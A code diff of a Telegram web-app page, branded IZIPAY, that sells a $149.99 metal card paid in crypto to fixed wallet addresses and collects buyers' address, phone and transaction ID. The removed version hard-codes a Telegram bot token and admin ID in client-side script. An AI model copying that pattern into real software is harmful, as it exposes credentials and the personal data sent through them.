@@ -3,454 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Physical Card | IZIPAY</title>
-    
+    <title>Physical Card Order | IZIPAY</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
     
     <style>
         :root {
-            --bg-dark: #0f1115;      
-            --card-bg: #ffffff;      
-            --primary-green: #638576; 
-            --primary-hover: #4e6b5e;
-            --text-dark: #1a1a1a;
-            --text-gray: #8e8e93;
-            --border-light: #e5e7eb;
-            --metal-gold: #D4AF37;
+            --bg-dark: #0f1115; --card-bg: #ffffff; --primary-green: #638576; 
+            --text-dark: #1a1a1a; --text-gray: #8e8e93; --border-light: #e5e7eb;
+            --toggle-bg: #f3f4f6; --warning-amber: #b45309;
         }
-
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-dark);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* ===== HEADER ===== */
-        .mobile-header {
-            padding: 20px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-shrink: 0;
-        }
-
-        .back-btn {
-            width: 40px; height: 40px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.1);
-            color: white;
-            display: flex; align-items: center; justify-content: center;
-            text-decoration: none; font-size: 20px;
-        }
-
-        /* ===== CONTENT SHEET ===== */
-        .content-sheet {
-            background: var(--card-bg);
-            flex-grow: 1;
-            border-top-left-radius: 32px;
-            border-top-right-radius: 32px;
-            padding: 32px 24px;
-            color: var(--text-dark);
-            overflow-y: auto;
-            animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .sheet-intro { margin-bottom: 24px; }
-        .sheet-intro h1 { font-size: 24px; font-weight: 700; color: var(--text-dark); margin-bottom: 8px; }
-        .sheet-intro p { font-size: 14px; color: var(--text-gray); line-height: 1.5; }
-
-        .payment-summary {
-            background: #f9fafb;
-            border-radius: 20px;
-            padding: 24px;
-            margin-bottom: 24px;
-            text-align: center;
-            border-left: 4px solid var(--metal-gold);
-        }
-
-        .price-label { font-size: 13px; color: var(--text-gray); font-weight: 500; }
-        .price-main { font-size: 32px; font-weight: 700; color: var(--text-dark); margin-top: 4px; }
-
-        /* Crypto List */
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: white; min-height: 100vh; display: flex; flex-direction: column; }
+        .mobile-header { padding: 24px; display: flex; align-items: center; justify-content: space-between; }
+        .back-btn { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.1); color: white; display: flex; align-items: center; justify-content: center; text-decoration: none; }
+        .content-sheet { background: var(--card-bg); flex-grow: 1; border-top-left-radius: 32px; border-top-right-radius: 32px; padding: 32px 24px; color: var(--text-dark); overflow-y: auto; }
+        .payment-summary { background: var(--toggle-bg); border-radius: 20px; padding: 24px; margin-bottom: 16px; text-align: center; border-left: 4px solid #D4AF37; }
+        .price-main { font-size: 32px; font-weight: 700; color: var(--text-dark); }
         .crypto-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-bottom: 30px; }
-
-        .crypto-item {
-            background: white;
-            border: 1px solid var(--border-light);
-            border-radius: 16px;
-            padding: 16px;
-            display: flex; align-items: center; gap: 16px;
-            cursor: pointer; transition: 0.2s;
-        }
-
-        .crypto-item:hover { border-color: var(--metal-gold); background: #fef9e7; }
-        .crypto-item.active { border: 2px solid var(--metal-gold); background: #fef9e7; }
-
-        .crypto-icon { width: 36px; height: 36px; object-fit: contain; }
-        .crypto-info { flex: 1; }
-        .c-name { font-size: 15px; font-weight: 600; color: var(--text-dark); }
-        .c-network { font-size: 12px; color: var(--text-gray); }
-
-        .radio-circle {
-            width: 20px; height: 20px;
-            border: 2px solid var(--border-light);
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .crypto-item.active .radio-circle { border-color: var(--metal-gold); }
-        .radio-dot { width: 10px; height: 10px; background: var(--metal-gold); border-radius: 50%; display: none; }
-        .crypto-item.active .radio-dot { display: block; }
-
-        /* Address Box */
-        .address-box {
-            background: var(--bg-dark);
-            color: white;
-            border-radius: 20px;
-            padding: 24px;
-            margin-top: 20px;
-            display: none;
-            animation: fadeIn 0.3s;
-        }
+        .crypto-item { background: white; border: 1px solid var(--border-light); border-radius: 16px; padding: 16px; display: flex; align-items: center; gap: 16px; cursor: pointer; }
+        .crypto-item.active { border: 2px solid #D4AF37; background: #fffdf5; }
+        .crypto-icon { width: 32px; height: 32px; }
+        .address-box { background: var(--bg-dark); color: white; border-radius: 20px; padding: 24px; display: none; margin-top: 20px; }
         .address-box.show { display: block; }
-
-        .addr-label { font-size: 12px; color: var(--text-gray); margin-bottom: 8px; text-transform: uppercase; }
-        .addr-val {
-            font-family: monospace; font-size: 14px; word-break: break-all;
-            background: rgba(255,255,255,0.1); padding: 12px; border-radius: 12px;
-            margin-bottom: 20px; color: #f3f4f6;
-        }
-
-        .copy-btn {
-            width: 100%; background: var(--metal-gold); color: white; border: none;
-            padding: 14px; border-radius: 12px; font-weight: 600; cursor: pointer;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-        }
-
-        .btn-paid {
-            width: 100%; background: transparent; color: var(--metal-gold);
-            border: 1.5px solid var(--metal-gold); padding: 14px;
-            border-radius: 12px; font-weight: 600; cursor: pointer;
-            margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 8px;
-        }
-
-        .confirm-form-container { display: none; animation: fadeIn 0.3s; }
-        .input-group { margin-bottom: 20px; }
-        .input-group label { display: block; font-size: 12px; color: var(--text-gray); margin-bottom: 8px; font-weight: 600; }
-        .input-group input { width: 100%; padding: 12px; border-radius: 12px; border: 1px solid var(--border-light); background: #f9fafb; }
-
-        /* Toast */
-        .toast {
-            position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px);
-            background: white; color: var(--text-dark); padding: 12px 24px; border-radius: 50px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15); font-size: 14px; z-index: 2000; transition: 0.3s; opacity: 0;
-        }
-        .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-
-        /* Two columns for delivery info */
-        .two-columns {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .addr-val { font-family: monospace; font-size: 13px; word-break: break-all; background: rgba(255,255,255,0.1); padding: 12px; border-radius: 12px; margin: 15px 0; color: #f3f4f6; }
+        .copy-btn { width: 100%; background: var(--primary-green); color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; cursor: pointer; }
+        .btn-paid { width: 100%; background: transparent; color: var(--primary-green); border: 1.5px solid var(--primary-green); padding: 14px; border-radius: 12px; margin-top: 10px; cursor: pointer; }
+        .confirm-view { display: none; }
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 11px; color: var(--text-gray); margin-bottom: 5px; font-weight: 600; }
+        .input-group input { width: 100%; padding: 12px; border-radius: 12px; border: 1px solid var(--border-light); background: var(--toggle-bg); }
+        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px); background: white; padding: 12px 24px; border-radius: 50px; transition: 0.3s; z-index: 9999; color: black; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        #toast.show { transform: translateX(-50%) translateY(0); }
     </style>
 </head>
 <body>
 
-<div id="toast" class="toast">Address copied!</div>
+<div id="toast">Address copied!</div>
 
 <div class="mobile-header">
     <a href="index.html" class="back-btn"><i class="ri-arrow-left-line"></i></a>
-    <h1 style="font-size: 18px; font-weight: 600;">Physical Card</h1>
+    <h1 style="font-size: 18px;">Order Metal Card</h1>
     <div style="width:40px;"></div>
 </div>
 
 <div class="content-sheet">
-    <div class="sheet-intro">
-        <h1>Premium Metal Card</h1>
-        <p>Order your luxury metal card with worldwide shipping. Delivery takes 3-7 business days.</p>
-    </div>
-
     <div id="selection-view">
         <div class="payment-summary">
-            <div class="price-label">Metal Card Fee</div>
+            <div style="color: #888; font-size: 12px;">Physical Metal Issuance</div>
             <div class="price-main">$149.99</div>
         </div>
 
-        <h3 style="margin-bottom: 16px; font-size: 16px; font-weight: 600;">Select Payment Network</h3>
+        <h3 style="margin-bottom: 16px; font-size: 15px; font-weight: 600;">Select Network</h3>
 
-        <h3 style="font-size: 16px; margin-bottom: 15px;">Choose Payment Method</h3>
-            <div class="crypto-grid">
-                <div class="crypto-item" onclick="selectCrypto('Bitcoin', 'bc1qrs8d7pckelsnlsl900s9m4adyaj8z7x4kdk7de', this)">
-                    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="crypto-icon">
-                    <div class="crypto-info"><b>Bitcoin</b><small>BTC Network</small></div>
-                </div>
-                
-                <div class="crypto-item" onclick="selectCrypto('Ethereum', '0xB1A08E801e3e79C0dEf1521263D7D54c6745D68c', this)">
-                    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="crypto-icon">
-                    <div class="crypto-info"><b>Ethereum</b><small>ERC-20</small></div>
-                </div>
-
-                <div class="crypto-item" onclick="selectCrypto('Tether (ERC20)', '0xB6D25D305B4Bf38C83DD67bC63Bd2562CE6Fd442', this)">
-                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="crypto-icon">
-                    <div class="crypto-info"><b>Tether (ERC20)</b><small>ERC-20</small></div>
-                </div>
-                
-                <div class="crypto-item" onclick="selectCrypto('Tether (TRC20)', 'TFtGBVYi99XEruhbvxq5bRcbm63aZe9ecR', this)">
-                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="crypto-icon">
-                    <div class="crypto-info"><b>Tether (TRC20)</b><small>TRC-20</small></div>
-                </div>
-
-                <div class="crypto-item" onclick="selectCrypto('Tether (BEP20)', '0xB6D25D305B4Bf38C83DD67bC63Bd2562CE6Fd442', this)">
-                    <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" class="crypto-icon">
-                    <div class="crypto-info"><b>Tether (BEP20)</b><small>BEP-20 (BSC)</small></div>
-                </div>
-
-                <div class="crypto-item" onclick="selectCrypto('USDC', '0xB6D25D305B4Bf38C83DD67bC63Bd2562CE6Fd442', this)">
-                    <img src="https://cryptologos.cc/logos/usd-coin-usdc-logo.png" class="crypto-icon">
-                    <div class="crypto-info"><b>USDC</b><small>ERC-20</small></div>
-                </div>
-
-                <div class="crypto-item" onclick="selectCrypto('Solana', 'EJw7E2DSRoax42enpB3p9DGoLNXnTNaD2MG1154xcAd9', this)">
-                    <img src="https://cryptologos.cc/logos/solana-sol-logo.png" class="crypto-icon">
-                    <div class="crypto-info"><b>Solana</b><small>Solana Network</small></div>
-                </div>
-
-                <div class="crypto-item" onclick="selectCrypto('Tron', 'TFtGBVYi99XEruhbvxq5bRcbm63aZe9ecR', this)">
-                    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" class="crypto-icon">
-                    <div class="crypto-info"><b>Tron</b><small>TRX Network</small></div>
-                </div>
+        <div class="crypto-grid">
+            <div class="crypto-item" onclick="selectCrypto('USDT (TRC20)', 'TYYF1FVn6vpEbq83s9QxCAXnkCzCDuqDSZ', this)">
+                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="crypto-icon">
+                <div style="flex:1"><b>Tether</b><br><small style="color:#888">TRC-20 Network</small></div>
             </div>
+            <div class="crypto-item" onclick="selectCrypto('Bitcoin', 'bc1qvjn8epw4l8hqm4y0rqy0dvjst279m3v7u9ru47', this)">
+                <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="crypto-icon">
+                <div style="flex:1"><b>Bitcoin</b><br><small style="color:#888">BTC Network</small></div>
+            </div>
+            <div class="crypto-item" onclick="selectCrypto('Solana', 'EqQpCbatN8xxxJpJFWgb9UAY8gdUFYg1Hd52juj3Fr4V', this)">
+                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" class="crypto-icon">
+                <div style="flex:1"><b>Solana</b><br><small style="color:#888">SOL Network</small></div>
+            </div>
+        </div>
 
         <div id="addressBox" class="address-box">
-            <div class="addr-label" style="text-align:center;">Send exactly $149.99 to:</div>
+            <div style="text-align:center; font-size: 12px; color: #aaa;">Send exactly $149.99 to:</div>
             <div class="addr-val" id="walletAddress">...</div>
-            <button class="copy-btn" onclick="copyAddress()"><i class="ri-file-copy-line"></i> Copy Address</button>
-            <button class="btn-paid" onclick="showForm()"><i class="ri-checkbox-circle-line"></i> I have paid</button>
+            <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+            <button class="btn-paid" onclick="showConfirm()">I have paid</button>
         </div>
     </div>
 
-    <div id="confirmFormView" class="confirm-form-container">
-        <h3 style="margin-bottom: 24px;">Delivery Details & Confirmation</h3>
-        
+    <div id="confirm-view" class="confirm-view">
+        <h3 style="margin-bottom: 20px;">Delivery Info & TXID</h3>
         <form id="paymentForm">
-            <input type="hidden" name="type" value="physical_card_order">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                <div class="input-group"><label>Country</label><input type="text" id="country" placeholder="e.g. USA" required></div>
+                <div class="input-group"><label>City</label><input type="text" id="city" placeholder="e.g. NYC" required></div>
+            </div>
+            <div class="input-group"><label>Address</label><input type="text" id="address" placeholder="Full delivery address" required></div>
+            <div class="input-group"><label>Phone</label><input type="tel" id="phone" placeholder="+1..." required></div>
+            <div class="input-group"><label>Transaction Hash (TXID)</label><input type="text" id="txid" placeholder="Paste TXID here" required></div>
             
-            <div class="two-columns">
-                <div class="input-group">
-                    <label>Country</label>
-                    <input type="text" name="country" placeholder="e.g. USA" required>
-                </div>
-                <div class="input-group">
-                    <label>City</label>
-                    <input type="text" name="city" placeholder="e.g. New York" required>
-                </div>
-            </div>
-
-            <div class="input-group">
-                <label>Postal Code</label>
-                <input type="text" name="postal_code" placeholder="Zip code" required>
-            </div>
-
-            <div class="input-group">
-                <label>Full Delivery Address</label>
-                <input type="text" name="address" placeholder="Street, Building, Apt" required>
-            </div>
-
-            <div class="input-group">
-                <label>Phone Number</label>
-                <input type="tel" name="phone" placeholder="+1 234 567 890" required>
-            </div>
-
-            <div style="background: #fef9e7; border: 1px solid #ffe066; padding: 12px; border-radius: 12px; margin: 20px 0;">
-                <p style="font-size: 12px; color: #856404; line-height: 1.4;">
-                    <i class="ri-information-line"></i> <strong>Important:</strong> Provide a valid <strong>Transaction ID (TXID)</strong>. 
-                    Shipping will begin after payment verification.
-                </p>
-            </div>
-
-            <div class="input-group">
-                <label>Transaction ID / TXID <span style="color:red">*</span></label>
-                <input type="text" name="user_wallet" id="user_wallet" placeholder="Paste TXID here" required>
-            </div>
-            
-            <div class="input-group">
-                <label>Payment Proof (Screenshot)</label>
-                <input type="file" name="screenshot" id="screenshot" accept="image/*">
-                <p style="font-size: 11px; color: var(--text-gray); margin-top: 4px;">Recommended but optional</p>
-            </div>
-
-            <button type="submit" class="copy-btn" id="submitBtn">Submit Order</button>
-            <button type="button" class="btn-paid" style="border: none;" onclick="hideForm()">Cancel</button>
+            <button type="submit" class="copy-btn" id="submitBtn">Submit Confirmation</button>
+            <button type="button" class="btn-paid" style="border:none" onclick="location.reload()">Back</button>
         </form>
     </div>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
-    let selectedNetwork = "";
+    let selectedNet = "";
 
-    // Initialize Telegram Web App
-    tg.expand();
-    tg.setHeaderColor('#0f1115');
-    tg.setBackgroundColor('#0f1115');
-    
-    // Show back button
-    tg.BackButton.show();
-    tg.BackButton.onClick(function() {
-        hideForm();
-    });
-
-    function selectCrypto(name, address, element) {
-        selectedNetwork = name;
-        
-        // Remove active class from all items
-        document.querySelectorAll('.crypto-item').forEach(el => el.classList.remove('active'));
-        
-        // Add active class to selected item
-        element.classList.add('active');
-        
-        // Show address box
-        const box = document.getElementById('addressBox');
-        document.getElementById('walletAddress').textContent = address;
-        box.classList.add('show');
-        
-        // Haptic feedback
-        tg.HapticFeedback.impactOccurred('light');
-        
-        // Scroll to address box
-        setTimeout(() => {
-            box.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }, 100);
+    function selectCrypto(net, addr, el) {
+        selectedNet = net;
+        document.querySelectorAll('.crypto-item').forEach(i => i.classList.remove('active'));
+        el.classList.add('active');
+        document.getElementById('walletAddress').innerText = addr;
+        document.getElementById('addressBox').classList.add('show');
     }
 
     function copyAddress() {
-        const text = document.getElementById('walletAddress').innerText;
-        navigator.clipboard.writeText(text).then(() => {
-            const toast = document.getElementById('toast');
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 2000);
-            
-            // Haptic feedback
-            tg.HapticFeedback.notificationOccurred('success');
-        });
+        const addr = document.getElementById('walletAddress').innerText;
+        navigator.clipboard.writeText(addr);
+        const t = document.getElementById('toast');
+        t.classList.add('show');
+        setTimeout(() => t.classList.remove('show'), 2000);
+        tg.HapticFeedback.impactOccurred('medium');
     }
 
-    function showForm() {
+    function showConfirm() {
         document.getElementById('selection-view').style.display = 'none';
-        document.getElementById('confirmFormView').style.display = 'block';
-        
-        // Update back button behavior
-        tg.BackButton.onClick(function() {
-            hideForm();
-        });
+        document.getElementById('confirm-view').style.display = 'block';
     }
 
-    function hideForm() {
-        document.getElementById('selection-view').style.display = 'block';
-        document.getElementById('confirmFormView').style.display = 'none';
-        
-        // Update back button to go to index
-        tg.BackButton.onClick(function() {
-            window.location.href = "index.html";
-        });
-    }
-
-    // Form submission
     document.getElementById('paymentForm').onsubmit = async function(e) {
         e.preventDefault();
-        
-        const txid = document.getElementById('user_wallet').value.trim();
-        if (txid.length < 30) {
-            tg.showAlert("Please provide a valid TXID (at least 30 characters)");
-            return;
-        }
-
         const btn = document.getElementById('submitBtn');
         btn.disabled = true;
-        btn.innerHTML = '<i class="ri-loader-4-line" style="animation: spin 1s linear infinite; margin-right: 8px;"></i> Processing...';
+        btn.innerText = "Processing...";
 
-        // Add spinner animation
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes spin {
-                from { transform: rotate(0deg); }
-                to { transform: rotate(360deg); }
+        // Собираем данные в один объект
+        const payload = {
+            tg_id: tg.initDataUnsafe?.user?.id || "7897252945",
+            txid: document.getElementById('txid').value,
+            network: selectedNet,
+            amount: "149.99",
+            item: "Physical Metal Card",
+            delivery: {
+                country: document.getElementById('country').value,
+                city: document.getElementById('city').value,
+                address: document.getElementById('address').value,
+                phone: document.getElementById('phone').value
             }
-        `;
-        document.head.appendChild(style);
-
-        const user = tg.initDataUnsafe?.user || { first_name: "User", id: "000" };
-        const botToken = '8383398356:AAFJRxBGmhL2edF72kCcfStO-ho01tGhdUk';
-        const adminId = '7897252945';
-
-        // Get form data
-        const formData = new FormData(this);
-        const country = formData.get('country');
-        const city = formData.get('city');
-        const postal = formData.get('postal_code');
-        const address = formData.get('address');
-        const phone = formData.get('phone');
-        const file = document.getElementById('screenshot').files[0];
-
-        // Prepare message for admin
-        const text = `🏷️ *PHYSICAL CARD ORDER*\n\n👤 User: ${user.first_name}\n🆔 ID: ${user.id}\n💰 Amount: $149.99\n🌐 Network: ${selectedNetwork}\n\n📍 *Delivery Details:*\n🏳️ Country: ${country}\n🏙️ City: ${city}\n📮 Postal: ${postal}\n🏠 Address: ${address}\n📞 Phone: ${phone}\n\n🔗 TXID: \`${txid}\``;
+        };
 
         try {
-            // Send text message to admin
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            // Отправляем на ваш PHP API
+            const response = await fetch('https://izipay.me/api/send_payment_tg.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: adminId,
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify(payload)
             });
-
-            // Send screenshot if exists
-            if (file) {
-                const fd = new FormData();
-                fd.append('chat_id', adminId);
-                fd.append('photo', file);
-                fd.append('caption', `Payment proof from ${user.first_name}`);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
-                });
+            const result = await response.json();
+            
+            if (result.status === 'success') {
+                tg.showAlert("Success! Your physical card order is being processed.");
+                window.location.href = 'index.html';
+            } else {
+                tg.showAlert("Error: " + result.message);
+                btn.disabled = false;
+                btn.innerText = "Submit Confirmation";
             }
-
-            // Success
-            tg.HapticFeedback.notificationOccurred('success');
-            tg.showAlert("Order submitted successfully! We'll contact you for shipping updates.", () => {
-                window.location.href = "index.html";
-            });
-
-        } catch (error) {
-            tg.showAlert("Error sending order. Please try again.");
+        } catch (err) {
+            tg.showAlert("Connection error to server.");
             btn.disabled = false;
-            btn.innerHTML = 'Submit Order';
-            tg.HapticFeedback.notificationOccurred('error');
         }
     };
-
-    // Initialize
-    document.addEventListener('DOMContentLoaded', function() {
-        // Set initial back button behavior
-        tg.BackButton.onClick(function() {
-            window.location.href = "index.html";
-        });
-    });
 </script>
 </body>
 </html>
